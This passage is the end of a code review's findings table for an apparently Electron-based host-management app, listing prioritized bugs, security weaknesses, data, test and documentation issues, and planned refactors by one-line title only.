| BUG-001       | P0  |   XS   | Hardcoded developer absolute path imports                        |
| BUG-002       | P0  |   XS   | Renderer mount-point ID mismatch (`#app` vs `#root`)             |
| BUG-003       | P0  |   S    | Missing tailwind/postcss configs                                 |
| BUG-004       | P0  |   S    | ESLint flat config references uninstalled plugins                |
| BUG-005       | P0  |   XS   | `tsconfig.main.json` waives strict null checks; CJS+ESM clash    |
| BUG-006       | P0  |   XS   | `StatusBadge` dot uses string-literal not template-literal       |
| SEC-002       | P1  |   L    | Remote command injection on every managed host                   |
| SEC-003       | P1  |   M    | Plaintext credentials; "OS keychain" claim is false              |
| SEC-004       | P1  |   XS   | `app.enableSandbox()` only on non-darwin                         |
| SEC-005       | P1  |   XS   | `will-navigate` allows plain HTTP/file://                        |
| SEC-006       | P1  |   S    | No CSP set despite README claim                                  |
| SEC-007       | P1  |   S    | Electron Fuses not configured                                    |
| SEC-008       | P1  |   M    | App not signed/notarized; no auto-updater                        |
| SEC-009       | P1  |   XS   | `process.env` exposed via IPC denylist                           |
| DATA-001      | P1  |   M    | `INSERT OR REPLACE` upserts wipe unrelated columns               |
| DATA-002      | P1  |   M    | No migration system; `SCHEMA_VERSION` unused                     |
| DATA-003      | P1  |   M    | DB snake_case ↔ types camelCase mismatch                         |
| BUG-007       | P1  |   XS   | `split('\s+')` literal-string parser bug                         |
| BUG-008       | P1  |   S    | `host.service.upsertHost` parameter alignment off                |
| BUG-009       | P1  |   M    | `MetricsService` parser is empty / placeholder                   |
| BUG-010       | P1  |   L    | `MigrationService` no progress tracking                          |
| BUG-011       | P1  |   XS   | `LoggerService(source)` ignores `source`; `app` global leak      |
| BUG-012       | P1  |   XS   | `RootState = any`                                                |
| TEST-001      | P1  |   M    | DB tests skipped + placeholder `expect(true).toBe(true)`         |
| TEST-002      | P1  |   M    | Playwright tests don't run actual Electron                       |
| TEST-003      | P1  |   L    | No service-layer unit tests                                      |
| DOC-001       | P1  |   XS   | `COMPLETION_REPORT.md` falsely claims 100% complete              |
| BUG-013       | P2  |   XS   | Duplicate `LoadingSpinner`/`ErrorBoundary` files                 |
| BUG-014       | P2  |   XS   | `useAppSelector` untyped                                         |
| BUG-015       | P2  |   S    | Non-null assertions on null-returning helpers                    |
| BUG-016       | P2  |   S    | `parseInt` without radix                                         |
| BUG-017       | P2  |   S    | `parseUptime` regex / unit lookup fragile                        |
| BUG-018       | P2  |   S    | Cluster node regex too broad                                     |
| BUG-019       | P2  |   S    | Cluster status hardcoded to `healthy`                            |
| BUG-020       | P2  |   S    | Polling intervals + per-write retention scan                     |
| BUG-021       | P2  |   S    | `i18n` configured but unused                                     |
| BUG-022       | P2  |   S    | `uiSlice` fields unused                                          |
| BUG-023       | P2  |   S    | `connectedHosts` Map written, never read                         |
| BUG-024       | P2  |   XS   | `validPaths` whitelist truncates silently                        |
| BUG-025       | P2  |   S    | Header avatar is static `'A'`                                    |
| BUG-026       | P2  |   S    | Dashboard `+2` badge is static decoration                        |
| BUG-027       | P2  |   S    | `setInterval` not cleaned up on hot reload                       |
| BUG-028       | P2  |   XS   | Migration service `clearInterval` missing in shutdown loop       |
| BUG-029       | P2  |   S    | Cluster `master_host_id` always set to discoverer                |
| BUG-030       | P2  |   S    | RTK Query has no tag invalidation                                |
| BUG-031       | P2  |   S    | `ErrorBoundary` only logs to `console.error`                     |
| BUG-032       | P2  |   S    | `getHost` duplicated in 4 services                               |
| BUG-033       | P2  |   XS   | Unused vars / unused imports across services                     |
| BUG-034       | P2  |   S    | `uncaughtException`/`unhandledRejection` only logs               |
| BUG-035       | P2  |   XS   | Window position math fails on multi-monitor                      |
| BUG-036       | P2  |   S    | `migrate-cancel` uses internal UUID instead of libvirt name      |
| REFACTOR-001  | P3  |   S    | Typed IPC contract                                               |
| REFACTOR-002  | P3  |   L    | Replace raw SQL with Kysely/Drizzle                              |
| REFACTOR-003  | P3  |   L    | `HostConnection` abstraction                                     |
| REFACTOR-004  | P3  |   L    | Push-based host telemetry                                        |
| REFACTOR-005  | P3  |   M    | Adopt `electron-vite`                                            |
| REFACTOR-006  | P3  |   M    | Feature folders                                                  |
| REFACTOR-007  | P3  |   M    | Storybook + Chromatic                                            |
| REFACTOR-008  | P3  |   XS   | `react-icons` → `lucide-react`                                   |
| REFACTOR-009  | P3  |   S    | `theme.ts` → CSS variable bridge                                 |
| REFACTOR-010  | P3  |   M    | Observability primitives (logs / traces / metrics)               |
| REFACTOR-011  | P3  |   L    | Topology page WebGL force-graph                                  |
| REFACTOR-012  | P3  |   L    | Diagnostics rule engine                                          |
| REFACTOR-013  | P3  |   XL   | Playbook engine                                                  |
| REFACTOR-014  | P3  |   M    | `zod` at all I/O boundaries                                      |
| REFACTOR-015  | P3  |   S    | Persist window state                                             |
| REFACTOR-016  | P3  |   XS   | `requestSingleInstanceLock()`                                    |
| REFACTOR-017  | P3  |   XS   | Drop or finish i18next                                           |
| REFACTOR-018  | P3  |   XS   | Ship `preload.d.ts` for renderer IntelliSense                    |
| REFACTOR-019  | P3  |   S    | Strict CI gates                                                  |
| REFACTOR-020  | P3  |   XS   | License + SPDX headers                                           |

---

*End of review.*
